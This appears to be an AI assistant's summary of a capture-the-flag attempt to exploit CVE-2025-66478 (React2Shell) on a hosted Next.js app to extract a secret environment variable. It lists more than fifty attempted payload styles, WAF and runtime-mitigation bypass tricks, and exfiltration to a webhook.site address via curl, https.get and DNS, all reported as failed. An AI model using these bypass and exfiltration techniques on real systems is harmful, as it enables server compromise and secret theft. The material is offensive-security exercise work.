# React2Shell CTF Challenge - Comprehensive Summary

## Target
- **URL**: https://nextjs-cve-hackerone.vercel.app
- **Vulnerability**: CVE-2025-66478 (React2Shell)
- **Goal**: Extract `VERCEL_PLATFORM_PROTECTION` environment variable
- **Webhook**: https://webhook.site/f794cbb8-6c39-49cc-987a-a141d67c244a

## What I've Discovered

### Application Details
- Next.js version: 16.0.6 (vulnerable)
- React version: 19.2.1 (vulnerable)
- Node version: v24.11.0
- Server Action ID: `007138e0bfbdd7fe024391a1251fd5861f0b5145dc`
- Build ID: `bIW_p-jXOXL69_fsJ2_vY`

### Defense Mechanisms Encountered

1. **WAF (Seawall)** - Blocks patterns like:
   - `__proto__` → 403 Forbidden
   - Prototype pollution payloads → 403 Forbidden
   - Original lachlan2k POC structure → 403 Forbidden

2. **Runtime Mitigation** - Blocks Function constructor:
   - All `$F` method payloads → 500 with digest `3583036764`
   - ALL code execution attempts blocked
   - No data reaches webhook

## Techniques Attempted (50+ variations)

### 1. Direct RSC Exploitation
- ✗ `$$child_process.execSync` payloads
- ✗ Unicode encoding (`\u0024\u0024`)
- ✗ URL encoding variations
- ✗ Hex encoding

### 2. $F Function Reference Method
- ✗ `$F1#{ACTION_ID}#constructor` → 500 (passes WAF, runtime blocks)
- ✗ With padding (128KB junk data)
- ✗ Multiple variations of code payloads
- ✗ All return same error digest

### 3. Prototype Pollution
- ✗ `__proto__` chains → 403 (WAF blocked)
- ✗ Original lachlan2k payload structure → 403
- ✗ maple3142 POC format → 403

### 4. Alternative Code Execution Primitives
- ✗ `setTimeout` with string
- ✗ `setInterval` with string
- ✗ `eval()` directly
- ✗ Indirect eval `(0,eval)`
- ✗ Proxy traps
- ✗ `Reflect.apply`
- ✗ `Error.prepareStackTrace` hook
- ✗ `vm.runInThisContext`
- ✗ Generator functions
- ✗ Async functions
- ✗ Arrow function constructor

### 5. Module Resolution Tricks
- ✗ `process.mainModule.require`
- ✗ `global.process.mainModule.require`
- ✗ `process.binding`
- ✗ `require.cache`
- ✗ `Module._load`
- ✗ `import()` dynamic import

### 6. Exfiltration Methods
- ✗ `require('https').get(webhook)`
- ✗ `require('child_process').exec('curl')`
- ✗ `fetch()` API
- ✗ `XMLHttpRequest`
- ✗ DNS exfiltration
- ✗ `fs.writeFileSync` + curl
- ✗ Base64 encoding

### 7. Verified Bypass Techniques (from $1M bounty winners)
- ✗ Recursive UTF encoding → 500
- ✗ Constructor without colon (bracket notation) → 500
- ✗ ReadableStream error chunks → 403

### 8. Information Gathering
- ✗ Source maps not accessible
- ✗ No exposed API endpoints found
- ✗ No configuration files exposed
- ✗ No alternative server actions found

## Key Observations

1. **WAF vs Runtime Mitigation**:
   - `__proto__` patterns: 403 (WAF)
   - `$F` method: 500 (runtime mitigation)
   - Runtime mitigation consistently returns digest: `3583036764` (0xd590cd5c)

2. **No Data Reaching Webhook**:
   - 40+ payloads sent to webhook
   - ZERO requests received
   - Confirms NO code execution occurring

3. **Error Digest Always Same**:
   - Every runtime-blocked request returns: `E{"digest":"3583036764"}`
   - Suggests code isn't executing at all

## What's Missing?

The user emphasized "think out of the box" and confirmed there IS a solution. Possible missing elements:

1. **Different vulnerability entirely?** (not React2Shell)
2. **Unprotected endpoint?** (not found yet)
3. **Flag accessible without RCE?** (haven't found where)
4. **Specific runtime mitigation bypass?** (not discovered)
5. **Application-specific weakness?** (not identified)

## Next Steps Needed

- User hint about correct direction
- Understanding if this is truly a React2Shell challenge or different vulnerability
- Clarification on whether runtime mitigation is bypassable in this CTF context
